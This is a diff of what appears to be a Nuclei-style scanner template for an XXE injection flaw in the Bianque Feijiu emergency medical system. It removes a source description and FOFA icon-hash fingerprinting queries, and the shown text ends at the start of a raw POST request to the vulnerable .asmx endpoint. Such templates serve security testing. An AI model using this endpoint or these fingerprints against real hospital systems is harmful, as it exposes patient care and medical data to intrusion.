@@ -3,12 +3,8 @@ info:
   name: 扁鹊飞救智能急救与质控系统 CreateJKDA XML实体注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yt8xq8hvmt26659w'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yt8xq8hvmt26659w
-    fofa: icon_hash="-757866684" || icon_hash="-1206146847"
 http:
 - raw:
   - 'POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/YZGH HTTP/1.1
